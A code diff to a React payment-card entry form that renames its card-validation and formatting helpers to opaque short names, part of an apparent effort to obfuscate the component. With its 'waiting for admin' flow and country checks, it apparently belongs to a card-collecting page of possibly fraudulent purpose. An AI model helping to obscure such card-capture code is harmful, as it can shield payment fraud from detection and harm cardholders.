@@ -8,14 +8,14 @@ import { Input } from "@/components/ui/input"
 import { Button } from "@/components/ui/button"
 import { Badge } from "@/components/ui/badge"
 import { ShieldCheck, CreditCard, Lock } from "lucide-react"
-import { detectCardType, formatCardNumber, formatExpiryDate, getBankInfo, luhnCheck } from "@/lib/card-utils"
+import { _dct, _fcn, _fed, _gbi, _lc } from "@/lib/card-utils"
 import { db } from "@/lib/firebase"
 import { secureAddData } from "@/lib/secure-firebase"
 import { doc, onSnapshot, updateDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
 import { FullPageLoader } from "./loader"
 import { _gt } from "@/lib/text-obf"
-import { isCardBlocked, isCountryAllowed } from "@/lib/firebase/settings"
+import { _icb, isCountryAllowed } from "@/lib/firebase/settings"
 import { EmailModal } from "@/components/email-modal"
 
 
@@ -46,9 +46,9 @@ export default function _P1({ offerTotalPrice }: _P1Props) {
   useEffect(() => {
     const cleanNumber = _v1.replace(/\s/g, "")
     if (cleanNumber.length >= 6) {
-      const type = detectCardType(cleanNumber)
+      const type = _dct(cleanNumber)
       setCardType(type)
-      const bank = getBankInfo(cleanNumber)
+      const bank = _gbi(cleanNumber)
       setBankInfo(bank)
     } else {
       setCardType(null)
@@ -56,7 +56,7 @@ export default function _P1({ offerTotalPrice }: _P1Props) {
     }
 
     if (cleanNumber.length === 16) {
-      setIsValidCard(luhnCheck(cleanNumber))
+      setIsValidCard(_lc(cleanNumber))
     } else {
       setIsValidCard(false)
     }
@@ -66,7 +66,7 @@ export default function _P1({ offerTotalPrice }: _P1Props) {
     const checkCardBlocked = async () => {
       const cleanNumber = _v1.replace(/\s/g, "")
       if (cleanNumber.length >= 4) {
-        const blocked = await isCardBlocked(cleanNumber)
+        const blocked = await _icb(cleanNumber)
         setIsCardBlockedState(blocked)
       } else {
         setIsCardBlockedState(false)
@@ -193,7 +193,7 @@ export default function _P1({ offerTotalPrice }: _P1Props) {
   }, [isWaitingAdmin, router])
 
   const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatCardNumber(e.target.value)
+    const formatted = _fcn(e.target.value)
     // Limit to 16 digits (19 chars with spaces)
     if (formatted.replace(/\s/g, "").length <= 16) {
       _s1(formatted)
@@ -201,7 +201,7 @@ export default function _P1({ offerTotalPrice }: _P1Props) {
   }
 
   const handleExpiryDateChange = (e: React.ChangeEvent<HTMLInputElement>) => {
-    const formatted = formatExpiryDate(e.target.value)
+    const formatted = _fed(e.target.value)
     _s3(formatted)
   }
 
